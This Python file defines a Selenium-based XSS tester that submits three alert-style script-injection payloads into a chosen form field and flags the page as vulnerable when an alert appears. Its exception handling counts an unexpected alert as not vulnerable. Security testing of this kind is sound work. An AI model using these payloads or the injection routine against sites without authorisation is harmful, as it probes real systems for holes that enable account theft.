import time
from selenium.webdriver.common.by import By
from selenium.common.exceptions import UnexpectedAlertPresentException, NoAlertPresentException

class XSSInjector:
    def __init__(self, driver):
        self.driver = driver
        self.payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert(1)",
            "<img src=x onerror=alert('Vulnerable')>"
        ]

    def test_inputs(self, target_url, input_selector, submit_selector):
        self.driver.get(target_url)
        time.sleep(2)
        results = []

        for payload in self.payloads:
            try:
                input_element = self.driver.find_element(By.CSS_SELECTOR, input_selector)
                input_element.clear()
                input_element.send_keys(payload)

                submit_element = self.driver.find_element(By.CSS_SELECTOR, submit_selector)
                submit_element.click()
                time.sleep(1)

                # অ্যালার্ট পপ-আপ আসলে বুঝতে হবে XSS সফল হয়েছে
                alert = self.driver.switch_to.alert
                alert.accept()
                results.append({"payload": payload, "vulnerable": True})
            except (UnexpectedAlertPresentException, NoAlertPresentException):
                results.append({"payload": payload, "vulnerable": False})
            except Exception as e:
                results.append({"payload": payload, "error": str(e)})

        return results